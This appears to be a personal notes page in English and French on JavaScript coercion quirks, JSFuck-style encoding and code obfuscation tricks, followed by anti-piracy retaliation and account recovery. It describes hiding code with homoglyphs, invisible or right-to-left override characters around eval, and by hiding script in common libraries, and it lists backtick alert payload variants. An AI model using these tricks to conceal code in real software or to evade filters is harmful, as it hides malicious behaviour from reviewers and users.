- `(null < 0) === false && (null > 0) === false && (null == 0) === false && (null === 0) === false` but `(null + 1) === 1`, `null <= 0 && null >= 0`, `!null === true` (null is integerflexible)
- `"200" - 0 === 200; "200" + 0 === 200`

```js
var $ = ~[];				// -1
$ = {
	___: ++$,				// 0   : 	-1 + 1 is 0
	$$$$: (![] + "")[$],	// "f" : ![] is false, +"" converts false to "false" "false"[0] is "f"
	__$: ++$,				// 1   : 0 + 1 is 1
	$_$_: (![] + "")[$],	// "a" : "false"[1] is "a"
	_$_: ++$,				// 2   : 1 + 1 is 2
	$_$$: ({} + "")[$],		// "b" : {} is an object, +"" converts it to "[object Object]", "[Object object]"[2] is "b"
	$$_$: ($[$] + "")[$],	// "d" : 2[2] is undefined, +"" converts it to "undefined", "undefined"[2] is "d" 
	_$$: ++$,				// 3   : 2 + 1 is 3
	$$$_: (!"" + "")[$],	// "e" : !"" is true, +"" converts it to "true", "true"[3] is "e"
	$__: ++$,				// 4   : 3 + 1 is 4
	$_$: ++$,				// 5   : 4 + 1 is 5
	$$__: ({} + "")[$],		// "c" : {} is an object, +"" converts it to "[object Object]", "[Object object]"[5] is "c"
	$$_: ++$,				// 6   : 5 + 1 is 6
	$$$: ++$,				// 7   : 6 + 1 is 7
	$___: ++$,				// 8   : 7 + 1 is 8
	$__$: ++$				// 9   : 8 + 1 is 9
};
```

```js
$.$_ = ($.$_ = $ + "")[$.$_$] + ($._$ = $.$_[$.__$]) + ($.$$ = ($.$ + "")[$.__$]) + ((!$) + "")[$._$$] + ($.__ = $.$_[$.$$_]) + ($.$ = (!"" + "")[$.__$]) + ($._ = (!"" + "")[$._$_]) + $.$_[$.$_$] + $.__ + $._$ + $.$;

// Explanation:
// $.$_ = "[object Object]"[5] + "[object Object]"[1] + "undefined"[2] + 
// "false"[3] + "[object Object]"[6] + "true"[1] + "true"[2] + "c"+"t"+"o"+ "r";

// Result:
// $.$_ = "c"+"o"+"n"+"s"+"t"+"r"+"u"+"c"+"t"+"o"+"r";
```

```js
$.$$ = $.$ + (!"" + "")[$._$$] + $.__ + $._ + $.$ + $.$$;
//     "r" + "true"[3]         + "t"  + "u" + "r" + "n" ;
```

```js
$.$ = ($.___)[$.$_][$.$_];
```

```js
// No alphanumeric characters, all 32 ASCII symbols
-~!/#/^("\@"._*[,]>='<'?$&+_|$:``%{});// === 1
```

Then evaluate JavaScript. See [Parse JavaScript using the native parser](JavaScript#parse-javascript-using-the-native-parser)

```js
var w = this;
for(p1 in w)
	// 110 = "n"
	// 114 = "r"
	if(p1.length == 9 && p1.charCodeAt(0) == 110 && p1.charCodeAt(8) == 114){
		break;
	}
for(p2 in w[p1]){
	// 112 = "p"
	// 115 = "s"
	if(p2.length == 7 && p2.charCodeAt(0) == 112 && p2.charCodeAt(6) == 115){
		break;
	}
}
//w = "window", p1 = "navigator", p2 = "plugins"
w[p1][p2]["length"];
```

> [The minus operator (`-`)](http://www.ecma-international.org/ecma-262/7.0/index.html#sec-subtraction-operator-minus) coerces both of its operands to numbers.
> [The plus operator (`+`)](http://www.ecma-international.org/ecma-262/7.0/index.html#sec-addition-operator-plus) is special in that it has two modes.
> First, its normal mode is adding two numbers. Therefore, many values are coerced to numbers
> Second, using plus for string concatenation is also supported. Therefore, as soon as one of the operands is a string, the other one is converted to a string, too
> The exact algorithm for + looks like this:
> 1. Ensure that both operands are primitives. Objects `obj` are converted to primitives via the internal operation `ToPrimitive(obj)`, which calls `obj.valueOf()` and – if that doesn’t work – `obj.toString()`. For dates, `obj.toString()` is called first.
> 2. If either operand is a string, then convert both to strings and return the concatenation of the results.
> 3. Otherwise, convert both operands to numbers and return the sum of the results.

— ["200" + 0 returns "2000", but "200" - 0 return 200...wtf javascript](https://www.reddit.com/r/javascript/comments/55jh40/200_0_returns_2000_but_200_0_return_200wtf/d8b7b2a)
- `[] + [] === ""`, `String([] + {}) === "[Object object]"`, `{} + [] === 0`, `String(new Array(16)) === ",,,,,,,,,,,,,,,"`

- `[1] + [2] - [3] == 9` - [Why does \[1\] + [2] - [3] = 9 : javascript](https://www.reddit.com/r/javascript/comments/5lmgpz/why_does_1_2_3_9/)
- [What is {} + {} in JavaScript?](http://www.2ality.com/2012/01/object-plus-object.html)
- [You Don't Know JS: Types & Grammar - You-Dont-Know-JS/ch4.md at master · getify/You-Dont-Know-JS](https://github.com/getify/You-Dont-Know-JS/blob/master/types%20%26%20grammar/ch4.md)
- [Arithmetic operators - JavaScript | MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Arithmetic_Operators)
- [Equality comparisons and sameness - JavaScript | MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Equality_comparisons_and_sameness)
- [wtfjs - a little code blog about that language we love despite giving us so much to hate](http://wtfjs.com/)
- [JS Comparison Table](https://dorey.github.io/JavaScript-Equality-Table/)
- [Zeros in JavaScript](http://zero.milosz.ca/)

##### Obfuscation (code)

See [Hacking](#hacking)

Obfuscate code and bytecode

Pirates bypass anti-viruses. Client integrity — prevent client to modify instruction/code. See [Malware](#malware)

- Ajouter du bruit / Injection de code inutile (alourdir volontairement le code pour noyer dans la masse)
	* ajout d'instructions valides inutiles et/ou d'arguments inutiles aux fonctions (pour rendre la lecture du code plus complexe)
	* ajout d'instructions invalides et un saut au-dessus de ces instructions pour dérégler les désassembleurs ne supportant pas ce genre de « protection »
	* Utiliser différents contexts, récursions, remplacement de boucles, conditions et opérations par des version plus complexes (`x/2` -> `x >>> 1`)
	* http://en.wikipedia.org/wiki/Write-only_language
	* [Spaghetti code — Wikipedia](https://en.wikipedia.org/wiki/Spaghetti_code)
- mangle names: identifiants renommés avec des noms sémantiquement muets, avec caractères non affichables ([espace visible ou non](http://en.wikipedia.org/wiki/Space_%28punctuation%29#Spaces_in_Unicode), null char `\x0`, charactères spéciaux `/\"'(){}`) ou nom portant confusion avec l'API native
- `base64(base64(payload))`, `btoa(pako.deflate(root.dca_compressor.utf16to8(JSON.stringify(requests)), {to: "string"}))`
	
	See also:

	* [mikemo » AprilScript: ActionScript worst practices](http://wayback.archive.org/web/20111029080653/http://www.morearty.com/blog/2009/04/01/aprilscript-actionscript-worst-practices/)
	* [How To Write Unmaintainable Code](https://www.thc.org/root/phun/unmaintain.html)
- remove indentation, remove non significative spaces
- remove comments
- [Polymorphic code — Wikipedia](https://en.wikipedia.org/wiki/Polymorphic_code). Different operation give the same output (`1+3 == 6-2`, etc.)
- use different types: string or bits / bytes vs numbers
- intermediate state (use evaluation/decoding step)
	* [ROT13 — Wikipedia](https://en.wikipedia.org/wiki/ROT13), ROT47 - translate charset to an other charset. [Substitution cipher — Wikipedia](https://en.wikipedia.org/wiki/Substitution_cipher)
	* Encoder des informations (clés, bytecode…) dans les fichiers image, audio, etc.: [Hide data](#hide-data)
	* Encoder les informations (clés) dans des chaines courantes "This program cannot be run in DOS mode."
		- [assembly - Is it possible to hide a password defined within C++ code - Stack Overflow](https://stackoverflow.com/questions/5316562/is-it-possible-to-hide-a-password-defined-within-c-code/5316925#5316925)
- Use predictible but unsual / non logical / ambigous operations:
	* instead of boolean, return `String(boolean).charCodeAt(x)`, `func() == y` → `function foo(){(""+boolean)[1] == "r"} foo() == "y"`
	- (languages that support operator overloading) `path / file == path + "/" + file`
	* https://github.com/kitcambridge/evil.js - mess up Javascript native functions (ex. `isNaN()` always return true). See also https://github.com/mathiasbynens/evil.sh
	* use special chars or lookalike chars (confusable homoglyphs):
		- invisible char zero-width chars (U+200B, U+00AD): `window["test"] = "test"`, but `window["te​st"] != "test"`
			`var a = "http://e­x­a­m­p­l­e­.­com", b = "http://example.com"; a != b; a.split(/\s+/).join() == b`
		- http://www.unicode.org/Public/security/latest/confusables.txt see [UTS #39: Unicode Security Mechanisms](http://www.unicode.org/reports/tr39/#confusables)
		- [vhf/confusable_homoglyphs: ϲοｎｆｕѕаｂｌе＿һοｍоɡｌｙｐｈｓ](https://github.com/vhf/confusable_homoglyphs) (use the file provided by Unicode consortium)
		- greek question mark `;` (U+037E) vs. semicolon `;`
		- greek chars `Α, Β, Ε, Ζ, Η, Ι, Κ, Μ, Ν, Ο, Ρ, Τ, Υ, Χ, Ϊ, Ϋ, ο, Ϲ, Ϻ` vs `A, B, E, Z, H, I, K, M, N, O, P, T, Y, X, Ï, Ÿ, o, C, M`
		- Roman Numerals: `ⅰ, ⅴ, ⅹ, ⅼ, ⅽ, ⅾ, ⅿ` vs `i, v, x, l, c, d, m`
		- russia chars (depends fonts & styles): `а, е, и, м, о, о, п, р, р, с, т, у, х` vs `a, e, u, M, o, O, n, P, р, c, m, y, x`
		- diacritics: `é, è, ë, ê, ...` vs `e`. See [Diacritic — Wikipedia](https://en.wikipedia.org/wiki/Diacritic)
		- `﹩` vs `$`
		- `˸` vs `:`
		- ` ` vs `-`: ` 2 != -2`. `(2+ 40) == 42`. ` ` is a white space (Unicode `WSpace` `U+1680 OGHAM SPACE MARK`) See [Hyphen — Wikipedia](https://en.wikipedia.org/wiki/Hyphen#Unicode), [javascript - Why does 2+ 40 equal 42? - Stack Overflow](https://stackoverflow.com/questions/31507143/why-does-2-40-equal-42)
		- with JS implicit type coercion `"-2" == -2`, but `"−2" != -2` (`-` vs `−`)
		-`2*2==4`, but `2✲2==undefined`
		- `𝟣+𝟣` (`SyntaxError: Invalid or unexpected token`/`SyntaxError: illegal character`) `MATHEMATICAL SANS-SERIF DIGIT` [Unicode Characters in the 'Number, Decimal Digit' Category](http://www.fileformat.info/info/unicode/category/Nd/list.htm)
		- https://en.wikipedia.org/wiki/Whitespace_character#Spaces_in_Unicode
		- `'mañana' != 'mañana'; 'ma\xF1ana' != 'man\u0303ana'; 'ma\xF1ana'.length == 6; 'man\u0303ana'.length == 7;` https://mathiasbynens.be/notes/javascript-unicode#accounting-for-lookalikes
		
		Note: all languages / parsers / engines are not compatible
		
		See [Fancy transformation](Text#Fancy transformation)
		
		- https://github.com/reinderien/mimic and https://github.com/reinderien/mimic/wiki/Character-Set
		- [JavaScript variable name validator](https://mothereff.in/js-variables)
		- https://mathiasbynens.be/notes/javascript-identifiers-es6 and https://github.com/mathiasbynens/mothereff.in/tree/master/js-variables and https://stackoverflow.com/questions/1661197/what-characters-are-valid-for-javascript-variable-names
		
	* Use RLO (Right-to-Left Override) or Bidi chars:
	
        ```js
		(eye="‮rotator")+eval('alert(eye)')   
        ```
		
        ```js
		"‮";(llun=eval)
		"‮";llun(`"‮";alert
		(llun)`)
        ```
	
        ```js
		(a=1) > 0; (א=1) > 0;
        ```
	
		- [JS Bin - Collaborative JavaScript Debugging](https://jsbin.com/nihifi/edit?html,output)
		- [JS Bin - Collaborative JavaScript Debugging](https://jsbin.com/heriku/edit?html,output)
		- [Unicode Bidirectional Algorithm basics](https://www.w3.org/International/articles/inline-bidi-markup/uba-basics#mirroring)
	* [Mind your languages - 09-mind-languages.pdf](http://static.sstic.org/rumps2014/09-mind-languages.pdf) and ["Mind Your Languages" - Nouvel article sur l'importance des langages pour la sécurité - ANSSI](http://www.ssi.gouv.fr/fr/anssi/publications/publications-scientifiques/articles-de-conferences/mind-your-languages-nouvel-article-sur-l-importance-des-langages-pour-la.html)
	* [A Collection of JavaScript Gotchas - CodeProject](http://www.codeproject.com/Articles/182416/A-Collection-of-JavaScript-Gotchas)
	* 	eval(unescape(escape`𩁯𨱵𫑥𫡴𛡷𬡩𭁥𨀼𨱡𫡶𨑳𘁩𩀽𠐠𪁥𪑧𪁴🐲𝐰🡠𞱦𫱲𚁑🐶𩐴𞱑𛐭𞱁𛡧𩑴𠱯𫡴𩑸𭁠𜡤𨀮𩡩𫁬𤡥𨱴𚁑𙐳𜀰𛁑𛰳𜀰𛀱𛁉𛰹𜀩𚑦𫱲𚁖👘👑𛰱𜀰𙐳𛐲𛁗👙👑𛰳𩐴𛐱𛁉🐹𜀻𢐭𛐦𙡗𚡗🀹𞱗👚𚱚𚱙𚑚👖𚡗𛁖👖𚡖𛑗𚡗𚱘`.replace(/u../g,''))) // draw mandelbrot with 140 chars
		- [xem on Twitter: "eval(unescape(escape`𩁯𨱵𫑥𫡴𛡷𬡩𭁥𨀼𨱡𫡶𨑳𘁩𩀽𠐠𪁥𪑧𪁴🐲𝐰🡠𞱦𫱲𚁑🐶𩐴𞱑𛐭𞱁𛡧𩑴𠱯𫡴𩑸𭁠𜡤𨀮𩡩𫁬𤡥𨱴𚁑𙐳𜀰𛁑𛰳𜀰𛀱𛁉𛰹𜀩𚑦𫱲𚁖👘👑𛰱𜀰𙐳𛐲𛁗👙👑𛰳𩐴𛐱𛁉🐹𜀻𢐭𛐦𙡗𚡗🀹𞱗👚𚱚𚱙𚑚👖𚡗𛁖👖𚡖𛑗𚡗𚱘`.replace(/u../g,''))) // 140brot https://t.co/GPSFxeYwSD"](https://twitter.com/MaximeEuziere/status/843397121369956354)
	* IEEE 754 Floating-point numbers limitations
		- [particularité de IEEE 754 Floating-point numbers:](https://stackoverflow.com/questions/3730019/why-not-use-double-or-float-to-represent-currency)
		- [`0.1 + 0.2 != 0.3`](https://stackoverflow.com/questions/588004/is-floating-point-math-broken))
		- `0.2 + 0.4 !== 0.6`
		- `9999999999999999 == 10000000000000000`, `9999999999999999 + 2 == 10000000000000002`, `9999999999999999 + 3 == 10000000000000004`, `35.855*100 == 3585.4999999999995`
		- `Math.sin(Math.PI) < Number.EPSILON` `1.2246467991473532e-16 < 2.2204460492503130808472633361816E-16//2 ** -52`
		- `Math.abs(0.2 - 0.3 + 0.1) < Number.EPSILON`
		See `Number.EPSILON`
		- https://github.com/brianleroux/wtfjs/blob/master/posts/2010-02-16-more-floating-point-rounding.md
	* ECMAScript[wtfjs](https://github.com/brianleroux/wtfjs) - contains some posts about ECMAScript specificities
	* ECMAScript date with timezone: `new Date("2016-03-28").getDate() // could returns 27` "New Date(dateString), creates a new date object as ZERO time PLUS the input. You must take timezone-offset into account. If you don't specify a time-zone, the date-object defaults to your browser's time-zone (which might be different from UTC)"
		"Date string is parsed as UTC, then converted to local timezone. So in Boston, new Date("2017-02-28") is Feb 27 2017 19:00:00 GMT-0500 (EST)"
	* ECMAScript bitwise opertations transform 64 bits float to 32 bit integer
		- `~~0.5 == 0`
		[Tilde or the Floor? Practical use for JavaScript bitwise operators. (#1) | rocha.la](http://rocha.la/JavaScript-bitwise-operators-in-practice)
	* ECMAScript null
		`!(null > 0) && !(null == 0) && null >= 0`
		- [Javascript : The Curious Case of Null \>= 0 – Camp Vanilla](https://blog.campvanilla.com/javascript-the-curious-case-of-null-0-7b131644e274)
	* ECMAScript, zeros
		- `-0 === +0`
		- `3 / -0 === -Infinity` (or `Math.pow(-0, -1)`) where `3 / +0 === Infinity` (or `Math.pow(+0, -1)`)
		- http://speakingjs.com/es5/ch11.html#_distinguishing_the_two_zeros
	* ECMAScript, implicit type coercion, see [JSFuck and similar](#jsfuck-and-similar)
	* ECMAScript, rewrite test:
		- `let a = new Number(10); a.valueOf => 20; //-> a == 20; a !== 20; Number.prototype.valueOf.apply(a) === 10 // String(a) == "10" && a.toString() == "10" // typeof a == "object"` primitive can be wrapped by an object
		- `Symbol.hasInstance`, `Symbol.toPrimitive`, `Symbol.toStringTag`: http://www.2ality.com/2015/09/well-known-symbols-es6.html
	* ECMAScript, trailing comma don't add an element: [Trailing commas in JavaScript - Stack Overflow](https://stackoverflow.com/a/11306770/470117)
	* ECMAScript, `var x = NaN; x !== x`
	* ECMAScript: `0[["__proto__"]] === Number.prototype`: [An Abusive Relationship with AngularJS](http://slideshare.net/x00mario/an-abusive-relationship-with-angularjs)
	* Java: 
		- `Integer.valueOf(6) == Integer.valueOf(6)` but `Integer.valueOf(1000) != Integer.valueOf(1000)` (`==` is not `equal()`)
		- `(byte) + (char) - (int) + (long) - 1` (give `1`) (equivalent to `+ - + -1` and `-(-1)`?)
		Explainations: [Some Education While Feeding a Code Troll | Danimo's blog](https://daniel.molkentin.net/2015/02/18/some-education-while-feeding-a-code-troll/)
	* ECMAScript, `(new Date('2012-08-01')).getTime() - (new Date('2012-8-01')).getTime() !== 0`, `(new Date('2012-08-01')).getTime() - (new Date('2012/08/01')).getTime() !== 0`
	* ECMAScript, `this` in a closure or in global refer to `window` (ex.: in event listener) but not in arrow function nor in ES6 module
	* ECMAScript: `parseInt(0.0000008, 10) === 8` but `parseInt("0.0000008", 10) === 0` and `parseFloat(0.0000008, 10) === 8e-7`. Because `String(0.0000008) === 8e-7`. See [Chapter 11. Numbers](http://speakingjs.com/es5/ch11.html#parseInt)
	* ECMAScript, `window["eval"]()`
	* ECMAScript `Number("") === 0` `Number(" ") === 0` `Number("\u00A0") === 0`
	* ECMAScript `"--undefined--".search(undefined) == 0` `"--undefined--".search("undefined") == 2` `"--undefined--".search("a") == -1`
	* ECMAscript, [11 Ways to Invoke a Function](https://gist.github.com/myshov/05800f083a0afce56e0f782314a103eb)
	* ECMAScript, `[Function("console.log(this)")][0]()` `this` is the array itself. `const arr = [function(){return this === arr}]; arr[0]();// true` It's a method call (JS quirk of Array elements being properties). `arr` is an object, `0` is a method name, `this` is bound to arr
	* ECMAScript `var \u{61};` (valid in ES6)
	* ECMAScript `let n1 = 123,456,789;// 789`
	* ECMAScript `12 === 0xC === 0b1100 === 9+3`
	* ECMAScript [commas operators](http://speakingjs.com/es5/ch09.html#comma_operator).
		`var x = 0; var y = (x++, 10); x == 1 && y == 10;` can be written `var x = 0, y = (x++, 10);`
		`[].concat[1,2,3];` will return `[1,2,3]` if you do `Array.prototype.concat[3] = [1,2,3];` first.
		Other example: `({baz: "a"})["foo","bar","baz"]` is the same as `({baz: "a"})["baz"]`
		
		- http://www.2ality.com/2016/11/concat-array-literal.html
	* ECMAScript `void 4+7 === (void 4)+7`, `void 4+7 !== void (4+7)` http://speakingjs.com/es5/ch09.html#void_operator
	* ECMAScript: `["10", "10", "10"].map(parseInt) // [10, NaN, 2]`
		Because in `array.map(callback)`, the `callback` receive [3 parameters (`currentValue`, `index`, `array`)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/map#Parameters).
		And `parseInt()` accept [2 parameters (`string`, `radix`)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/parseInt#Parameters)
		
		Use `["10", "10", "10"].map(value => parseInt(value))` instead
	* ECMAScript: `Array.prototype.push("test"); let empty = []; empty.length === 0; empty[0] === "test"; Array.prototype[0] === "test"` `Array.isArray(Array.prototype))` same as `Object.prototype.foo = "bar"; let empty = {}; empty.foo === "bar"`
	* ECMAScript proxy: https://github.com/mathiasbynens/tpyo `const array = tpyo(['a', 'b', 'c']);array.lnegth;array.tosTr1ng();`
    - ECMAScript proxy:
        ```js
        with (MëtalÜmlauts()) {
            consöle.ërror('Mëtal');
            alërt('Ümlauts');
        }
        
        function MëtalÜmlauts(){
            const handler = {
                // always pretend the property exists
                has(){
                    return true;
                },
                
                // remplace umlauts in properties
                get(target, name){
                    const ascii = String(name).normalize("NFKD").replace(/[\u0300-\u036F]/g, "");
                    const property = Reflect.get(target, ascii);
                    switch(typeof property){
                        case "object":
                            return new Proxy(property, handler);
                            break;
                        case "function":
                            return property.bind(target);
                            break;
                        default:
                            return property;
                    }
                }
            };
            
            return new Proxy(window, handler);
        }
        ```
	* ECMAScript regexp previous match:
	
        ```js
		"abc".match(/b/);
		console.log(RegExp["$`"]);// a
		console.log(RegExp["$&"]);// b
		console.log(RegExp["$'"]);// c
		console.log("abc".replace("b", "$`"));// aac
		console.log("abc".replace("b", "$&"));// abc
		console.log("abc".re:place("b", "$'"));// acc
        ```
	* ECMAScript string template
	
        ```js
		alert`1`				// no parenthesis needed
		Function`alert\`1\````	// escaped back-ticks
		!{[alert`1`]:null}		// back-tick & computed
		+{valueOf() alert`1`}	// method shorthand
		`hello`-alert`1`-`goodbye`	// concatenation
		`hello${alert(1)}goodbye`	// expression interpolation
        ```
	* ECMAScript:
	
        ```js
		let x = (() => {
			for (var i = 0; i < 5; i++) {
				try { return i; }
				finally { if (i != 3) continue; }
			}
		})();
		console.log( x ); // -> 3
        ```
		
		- [c# - Why can't a 'continue' statement be inside a 'finally' block? - Stack Overflow](https://stackoverflow.com/questions/17991036/why-cant-a-continue-statement-be-inside-a-finally-block)
	* Esoteric programming language that are subset of a language 
		see [JSFuck](#esoteric-programming-languages)
	* closures
	* enumerable
	* write or switch Object prototype
	* ECMAScript (and other language support) destructuring `[a, b] = [b, a]`
	* ECMAScript: redefined global variable, like undefined:
		- (≤ ES4) `undefined = "a"; typeof undefined != "undefined"`
		- in using function parameter `(function(undefined = "a") {typeof undefined != "undefined"})();`
		- `with({undefined: 1}){1 === undefined}`
		- `(() => {var undefined = 1; return 1 === undefined;})()`
		
		To resolve it, just use: `var trueUndefined = (function(undefined) {return undefined})();` or `var trueUndefined = void(0);`
	* PHP, copy array instead of using it reference. See [Is there a function to make a copy of a PHP array to another? - Stack Overflow](https://stackoverflow.com/questions/1532618/is-there-a-function-to-make-a-copy-of-a-php-array-to-another/1532632#1532632)
	* JS: [DOM clobbering](#dom-clobbering)
	* CSS: escaped char can be followed by space `.\65 lement{}` is same as `.element{}` but not `.e lement{}` (spaces are often used to combine selectors) [Using character escapes in markup and CSS](https://www.w3.org/International/questions/qa-escapes#cssescapes)
	* C, `#define true false`, `#define if(x) if((rand % 10) ? (x) : !(x))`, `#define if(x) if((x) && ( ((double)rand()*10.0 / (double)RAND_MAX) < 1.0))`
	* PHP `$func = 'foo';$func();// This calls foo()`: [PHP: Variable functions - Manual](http://php.net/manual/en/functions.variable-functions.php)
	* HTML: `<a href="#">Link</a href="#">` where the tag name is `a href="#"` where space is EN QUAD (U+2000) [#HTMLQuiz](http://html5te.st/quiz/)
	* This code is valid for both PHP and Java: https://gist.github.com/forairan/b1143f42883b3b0ee1237bc9bd0b7b2c
	* Math phenomens:
		- `1/99980001 = 1/Math.pow(9999, 2) = 0.00000001000200030004000500060007…9994999599969997999900000001000200030004…` (but without 9998)
		- `1/998001 = 1/Math.pow(999, 2) = 0.000001002003004005006007…994995996997999000001002003004…` (but without 998)
		- `1/9801 = 1/Math.pow(99, 2) = 0.000102030405…9697990001020304…` (sequence from 00 to 99, but without 98)
		- `1/81 = 1/Math.pow(9, 2) = 012345679/999999999 = 0.0123456790123456790123…` (without 8)
		
		`Math.floor(Math.pow(10, 1 + x)/81) % 10 == x// but doesn't works for all x (x=8 gives 9, x=9 gives 0, x=10 gives 1, etc.)`
		See [998,001 and its Mysterious Recurring Decimals - Numberphile - YouTube](https://www.youtube.com/watch?v=daro6K6mym8&feature=youtu.be&app=desktop)
		
        ```
		12345679*9 = 111111111
        ```
		
        ```
		1*8+1=9
		12*8+2=98
		123*8+3=987
		1234*8+4=9876
		12345*8+5=98765
		123456*8+6=987654
		1234567*8+7=9876543
		12345678*8+8=98765432
		123456789*8+9=987654321
		1234567890*8+0=9876543210
        ```
		
	* C `main(){printf(&unix["\021%six\012\0"], (unix)["have"]+"fun"-0x60);}` print `unix` when compiled on unix [`main(){printf(&unix\["\021%six\012\0"\], (unix)["have"]+"fun"-0x60);}` - faehnri.ch](http://faehnri.ch/have-fun/)
	* Auto expand, in HTML `<table><td></td></table>` is parsed as `<HTML><HEAD></HEAD><BODY><TABLE><TBODY><TR><TD></TD></TR></TBODY></TABLE></BODY></HTML>`. See also HTML5 with non closed tags
	* HTML head and its children are not display by default, but can be `head,meta,title,link,script,style,base{display: block !important;min-width: 50px;min-height: 20px;overflow: visible;}`
	* Retro compatibility of ECMAScript RegExps [The madness of parsing real world JavaScript regexps](https://hackernoon.com/the-madness-of-parsing-real-world-javascript-regexps-d9ee336df983#.pm1rfh4zy)
	* ActionScript
	    
        ```as3
		package {
			import flash.display.*
			import flash.text.*
			
			public class AprilFools extends Sprite {
				エイプリルフール var Number = 4..toString()
		
				use namespace エイプリルフール
		
				function AprilFools()
				{
					get = set
					set = get
			
					with (createTextField())
					text = new Date(Number).toDateString()
				}
		
				function get get() { return Number + <><{Number}
					b={"/"+Number.split(/\//)[0]*502.25}/>..@b }
				function set get(set) { Number = set+'/'+set/4 }
		
				function get set() { return Number }
				function set set(get) { Number = get }
		
				// nothing fun here
				function createTextField():TextField
				{
					stage.scaleMode = StageScaleMode.NO_SCALE;
					stage.align = StageAlign.TOP_LEFT;
					var textField:TextField = new TextField();
					textField.width = 1000;
					addChild(textField);
					return textField;
				}
			}
		}
		
		namespace エイプリルフール
        ```

		- [mikemo » AprilScript: ActionScript worst practices](http://wayback.archive.org/web/20111029080653/http://www.morearty.com/blog/2009/04/01/aprilscript-actionscript-worst-practices/)
	- Python: [Obfuscating "Hello world!" – Ben Kurtovic](https://benkurtovic.com/2014/06/01/obfuscating-hello-world.html)
	- SQL: [SQL obfuscation](http://wayback.archive.org/web/20120203032738/http://sla.ckers.org/forum/read.php?24,35405)
- Hide you script in commonly used lib (ex: jQuery add special method or option)
- Centraliser le moins possible de méthodes ou objets
- encrypt the program if it's possible, like DRM, but require a full capable and trusted chain (end-to-end)
- remote execution : a part of the program is downloaded at each launch
	* Rendre le moins prévisible le fonctionnement (différentes méthodes, instructions provenant du server). Version de façon unique et "jettable" (méthodes et algorithmes différents)
- Control Flow obfuscation / Dynamic Code wrapping / Statement-Level Randomization
- simple:
	compress (deflate) + XOR with a key `This obfuscation is intended to discourage XXXX from making modifications to the YYYY. We know this 'encryption' is easily broken.`
	
	- [Orange: \[Bug Bounty\] GitHub Enterprise SQL Injection](http://blog.orange.tw/2017/01/bug-bounty-github-enterprise-sql-injection.html)
	- [decrypt obfuscated GitHub Enterprise .rb files](https://gist.github.com/geoff-codes/02d1e45912253e9ac183)
- Some good advices [How To Write Unmaintainable Code](https://github.com/Droogans/unmaintainable-code)
- SWF obfuscation
	See [SWF obfuscation](SWF#Obfuscation)
- [Gamasutra: Mary Min's Blog - Six Strategies for Protecting Your Mobile Games Against Hackers, Crackers & Copycatters](http://www.gamasutra.com/blogs/MaryMin/20150610/245625/Six_Strategies_for_Protecting_Your_Mobile_Games_Against_Hackers_Crackers__Copycatters.php)
- [Tricherie, piratage, vol de données… Bienvenue dans les jeux Facebook | Roxane](http://www.roxane-company.com/blog/2014/06/05/tricherie-piratage-vols-de-donn%C3%A9es-bienvenue-sur-les-jeux-facebook/)
- [Unbundling Pokémon Go — Applidium](https://applidium.com/en/news/unbundling_pokemon_go/)

See also:

- [ProGuard](http://proguard.sourceforge.net/) (obfuscation for Java)
- [Jscrambler | Make Your JavaScript Application Protect Itself](https://jscrambler.com/fr/) - Commercial solution for JavaScript
- [Obfuscation (software) - Wikipedia, the free encyclopedia](https://en.wikipedia.org/wiki/Obfuscation_(software))
- [Previous IOCCC Winners](http://www.ioccc.org/years.html) and [Spoiler summary](http://www.ioccc.org/all/summary.txt)
- [Dissecting a spammer's spam script – Our Technical Narrative](https://jelleraaijmakers.nl/2016/04/dissecting-spammers-spam-script)
- [PHP Code Deobfuscator](https://github.com/technopagan/php-code-deobfuscator) use `ltrace -e memcpy`
- [Cheat Engine :: View topic - [Library] Gamehacking Tools](http://forum.cheatengine.org/viewtopic.php?t=309234)
- [web-obfuscation - Web Application Obfuscation - Google Project Hosting](https://code.google.com/p/web-obfuscation/)
- [hackme: Deconstructing an ELF File](http://manoharvanga.com/hackme/)
- [How I Cracked a Keylogger and Ended Up in Someone's Inbox](https://www.trustwave.com/Resources/SpiderLabs-Blog/How-I-Cracked-a-Keylogger-and-Ended-Up-in-Someone-s-Inbox/)
	.Net keylogger cracked, reveal attacker's email credentials (but all email are forwarded to an other account)

### Reaction to violation

And recover, hijacking, pirated, hacked

> giving the attackers feedback that he has been identified helps him find your protection mechanism

- Wait adequate moment to act (ex.: let people play and cheat several days, and ban all detected players)
- offer them a discount to buy a copy
- (game) enclose cheaters in a "parallel world of cheaters" where they can play without disturbing non cheaters players (matchmaking): (multiplayer games) play togethers, (games with ranked score) cheated ranks only viewable by cheaters themself (but still see non cheated ranks)
- (game) make the game really harder or impossible: set invisibility to (random) enemies, add visual glitches, unpredictable/inaccurate interactions (less precise click and keys), trap the player in the scenario
- [Logic bomb — Wikipedia](https://en.wikipedia.org/wiki/Logic_bomb)
- [Video Game Cheaters Outed By Logic Bombs - Slashdot](https://games.slashdot.org/story/16/02/02/1732254/video-game-cheaters-outed-by-logic-bombs)
- [Eight of the Most Hilarious Anti-Piracy Measures in Video Games - IGN](http://www.ign.com/articles/2013/04/29/eight-of-the-most-hilarious-anti-piracy-measures-in-video-games)
- [12 hilarious, brutally devious ways game developers punish pirates | PCWorld](http://www.pcworld.com/article/2602876/software-games/10-hilarious-brutally-devious-ways-pc-game-developers-punish-pirates.html)
- "cyber-blurring": create fake email accounts, complete with phony documents, to confuse the attackers. "false accounts, with false content, as traps" (forged phishing emails)
	- [Hackers Came, but the French Were Prepared - The New York Times](https://www.nytimes.com/2017/05/09/world/europe/hackers-came-but-the-french-were-prepared.html)
	- [Macron hackers linked to Russian-affiliated group behind US attack | World news | The Guardian](https://www.theguardian.com/world/2017/may/08/macron-hackers-linked-to-russian-affiliated-group-behind-us-attack)

```php
// Wget troll
if(!empty($_SERVER['HTTP_USER_AGENT']) && preg_match('/Wget/', $_SERVER['HTTP_USER_AGENT'])){
	header('Location: ftp://speedtest.tele2.net/1000GB.zip', true, 302);
}
```

#### Recover compromised account

**Always check settings.** Ex: check if emails are not redirected (to catch bank informations, etc.)

- [Que faire si votre compte mail est piraté ?](http://lecollectif.orange.fr/articles/faire-compte-mail-pirate/)

#### Recover compromised website

**Verify before restore if the backup is not affected too.**

- [Are You Prepared Against A Hack? – Smashing Magazine](https://www.smashingmagazine.com/2014/05/are-you-prepared-against-a-hack/)
- [What to do if your WordPress site is hacked- OVH](https://www.ovh.co.uk/g1874.what_to_do_if_your_wordpress_site_is_hacked)
